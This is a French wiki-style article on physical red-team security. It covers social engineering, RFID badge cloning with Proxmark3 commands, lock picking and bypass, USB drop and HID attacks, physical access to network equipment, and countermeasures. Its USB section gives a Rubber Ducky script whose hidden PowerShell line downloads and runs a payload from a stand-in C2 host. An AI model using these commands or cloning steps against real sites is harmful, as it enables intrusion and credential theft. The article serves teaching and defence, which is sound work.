---
title: Physical Security
domain: sciences-appliquées
subdomain: informatique / sécurité
tags: [physical-security, rfid, lock-picking, tailgating, usb-drop, red-team, sécurité]
date: 2026-03-22
---

# Physical Security

La sécurité physique est la dimension souvent sous-estimée des engagements red team. L'accès physique à un bâtiment ou un équipement contourne la plupart des contrôles logiques. Un attaquant avec un accès physique de quelques minutes peut compromettre un réseau entier.

## Vecteurs d'accès physique

### Ingénierie sociale — Accès humain

```
Tailgating / Piggybacking :
  → Suivre un employé qui badge, en faisant mine de chercher son badge
  → Technique : arriver les bras chargés (cartons, café) → l'employé tient la porte

Pretexting :
  → Se déguiser en technicien IT, livreur, agent de ménage, prestataire
  → Avoir un badge imprimé, un uniforme, des outils visuellement crédibles
  → Script préparé : "Je viens remplacer le switch du rack B3"

Vishing préalable :
  → Appeler l'entreprise pour récupérer noms, procédures, terminologie interne
  → "Qui est le responsable informatique ?" → nommer la personne lors de l'accès physique

Clonage de badge visuel :
  → Observer les badges à distance (binoculaires, zoom photo)
  → Reproduire le design, le numéro de série visible, le logo
  → Les badges sans puce RFID sont trivaux à reproduire
```

### Clonage de badges RFID/NFC

```
Technologies RFID courantes :

| Fréquence | Exemples | Sécurité |
|---|---|---|
| 125 kHz LF | HID ProxCard, EM4100, Indala | Aucune — pas de chiffrement |
| 13.56 MHz HF | MIFARE Classic, DESFire, iCLASS | Variable (Classic = cassé) |
| UHF 860-960 MHz | Badges longue portée | Variable |

MIFARE Classic (très répandu) :
  → Algorithme propriétaire Crypto1 cryptanalysé en 2008
  → Attaque Darkside : récupérer la clé de secteur
  → Attaque nested : une clé connue → toutes les autres
  → Pratiquement tous les lecteurs MIFARE Classic sont vulnérables
```

```bash
# Proxmark3 — outil de référence pour l'audit RFID/NFC

# Identifier un badge
pm3 > auto

# LF (125 kHz) — lire et cloner HID/EM4100
pm3 > lf search          # Identifier le type de badge
pm3 > lf hid read        # Lire un badge HID
pm3 > lf hid clone --r RAWDATA   # Cloner sur un badge vierge

# HF (13.56 MHz) — MIFARE Classic
pm3 > hf search          # Identifier
pm3 > hf mf autopwn      # Attaque automatique (nested + darkside)
# → Dump complet de la carte si vulnérable

pm3 > hf mf dump         # Lire toutes les données
pm3 > hf mf restore      # Écrire sur une carte vierge (clonage)

# MIFARE DESFire — plus sécurisé
pm3 > hf mfdes info      # Informations sur la carte
# DESFire EV1/EV2/EV3 avec clés correctes → très difficile à cloner

# FlipperZero — outil polyvalent (RFID, NFC, SubGHz, IR)
# Interface accessible → très populaire en pentest physique
# Lire un badge HID 125kHz → stocker → émuler
```

### Long-range RFID Capture

```
Lecteurs longue portée : capture à distance du numéro de badge
  → Bishop Fox RFID Thief : antenne cachée dans une mallette/sac à dos
  → Proxmark3 RDV4 avec antenne boostée
  → Capture possible à 1-2m de la victime

Scénarios :
  → Serrer la main d'un employé → le badge est dans la poche
  → S'asseoir à côté dans le bus, le métro
  → File d'attente à la cafétéria
```

## Crochetage de serrures (Lock Picking)

```
Serrures à cylindre (pin tumbler) — principe :
  → Cylindre avec des paires de pins (key pins + driver pins)
  → La clé aligne tous les pins exactement à la shear line → rotation du cylindre
  → Sans clé → les driver pins bloquent la rotation

Technique Single Pin Picking (SPP) :
  1. Appliquer une légère tension de rotation avec une tension wrench
  2. Tester chaque pin avec un pick hook : le pin "binding" se soulève
  3. Soulever le pin binding jusqu'au click (pin set)
  4. Passer au pin suivant — quand tous sont set → ouverture

Raking :
  → Mouvement rapide d'un rake à travers tous les pins simultanément
  → Plus rapide que SPP, moins précis
  → Fonctionne bien sur les serrures de mauvaise qualité
```

```
Outils et cibles courantes :

Picks classiques :
  Short hook, medium hook, offset hook
  City rake, snake rake, bogota rake
  Tension wrenches (bottom of keyway ou top)

Bypass sans crochetage :
  → Shimming : insérer une fine lamelle entre pêne et gâche (serrures bas de gamme)
  → Under the door (UTD) : passer un outil sous la porte pour actionner la poignée intérieure
  → Loïd (carte de crédit) : pousser un pêne biseauté (portes mal calées)
  → Bumping : clé bump + marteau (technique contre les cylindres pin tumbler)
  → Master key : certains systèmes utilisent des clés maîtresses devinables

Serrures "sécurisées" :
  Abloy Protec2, Medeco, Mul-T-Lock → résistants au picking (mais pas au bypass)
  Serrures électroniques → souvent des mécanismes de secours exploitables
```

## USB Drops et HID Attacks

```
USB Drop Attack :
  → Déposer des clés USB malveillantes dans des parkings, halls d'entrée, etc.
  → Étude Carnegie Mellon (2016) : 48% des USB abandonnés sont branchés

Payloads USB courants :
  → Autorun malware (limité sur Windows 7+)
  → Rubber Ducky : émule un clavier HID → tape des commandes automatiquement
  → OMG Cable / O.MG : câble Lightning/USB-C avec implant WiFi intégré
  → Bash Bunny : MITM USB, HID, mass storage combinés
```

```bash
# Rubber Ducky — script (Ducky Script)
# Exemple : reverse shell en 5 secondes
DELAY 500
GUI r
DELAY 300
STRING powershell -w hidden -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://c2.com/p.ps1')"
ENTER

# Hak5 Bash Bunny — multi-mode (HID + mass storage)
# Mode attack switch 1 : HID typing
# Mode attack switch 2 : network MITM

# WiFi Pineapple — rogue AP pour capturer credentials WiFi
# → Se déploie dans les zones publiques, imite les SSIDs connus
```

## Accès aux équipements réseau

```
Équipements réseau souvent accessibles physiquement :

Switch non sécurisé physiquement :
  → Brancher un laptop → accès au réseau interne (VLAN, CDP, DTP)
  → Si port en mode trunk → accès à tous les VLANs

Accès console (port RJ45 console Cisco/HP) :
  → Câble console (RJ45 vers USB) → PuTTY → terminal
  → Si pas de mot de passe console → accès direct à la configuration
  → Si mot de passe perdu → procedure de password recovery (reset physique)

Routeur avec accès physique :
  → Mode ROMMON / recovery mode (bouton reset maintenu)
  → Modifier le registre de démarrage → ignorer le startup-config → accès complet

Serveurs :
  → iDRAC / iLO / IPMI : interface de gestion hors-bande accessible physiquement
  → Boot sur clé USB → Kali Linux → accès aux disques
  → DMA attack via Thunderbolt (PCILeech) → accès direct à la RAM → dump credentials
```

## Surveillance et contre-surveillance

```
Reconnaissance physique :
  → Observer les entrées (combien de gardes, présence de tourniquet)
  → Dumpster diving : récupérer des documents jetés (organigrammes, procédures, badges)
  → OSINT des photos sur LinkedIn, Google Street View → disposition des bureaux
  → Observation des badges (design, couleur par service) depuis l'extérieur

Counter-surveillance :
  → Vérifier si suivi (retours de route inhabituels)
  → Observer les cameras (orientation, zones mortes)
  → Éviter de déclencher des comportements suspicieux (rester trop longtemps au même endroit)
```

## Contre-mesures

```
Contrôle d'accès physique :
  ✓ Tourniquets + validation agent humain (pas seulement badge)
  ✓ Badges avec photo visible côté gardien
  ✓ Zones d'accès graduelles (visiteurs ne vont jamais seuls en zone sensible)
  ✓ Politique d'escorte systématique des non-employés
  ✓ Formation anti-tailgating (sensibilisation des employés)

Badges RFID :
  ✓ Migrer vers MIFARE DESFire EV3 ou iCLASS SE (algorithmes modernes)
  ✓ Utiliser des protections RFID (étuis blindés, porte-badges bloquants)
  ✓ Déployer des lecteurs multi-facteurs (badge + PIN ou badge + biométrie)
  ✓ Surveiller les lectures de badge inhabituelles (heures, lieux)

USB et matériel :
  ✓ Désactiver les ports USB en BIOS et via GPO
  ✓ Coller les ports USB inutilisés (résine, colle)
  ✓ Whitelist des périphériques USB autorisés (Windows Defender Device Control)
  ✓ Câbles de sécurité sur les équipements mobiles

Infrastructure réseau :
  ✓ Verrouillerles armoires réseau (racks fermés à clé)
  ✓ Désactiver les ports switch non utilisés (VLAN de quarantaine)
  ✓ 802.1X : authentification des équipements avant accès réseau
  ✓ Protéger les ports consoles des équipements réseau (mot de passe, chiffrement)

Destruction de documents :
  ✓ Déchiqueter les documents sensibles (niveau P-4 minimum)
  ✓ Politique de bureau vide (clear desk policy)
  ✓ Effacement sécurisé des disques avant mise au rebut

Procédures :
  ✓ Vérifier l'identité des prestataires (appel du prestataire officiel)
  ✓ Enregistrer les visiteurs, les escorter en permanence
  ✓ Exercices réguliers (simulation d'intrusion physique, formation)
  ✓ Caméras IP avec enregistrement 30 jours minimum
```
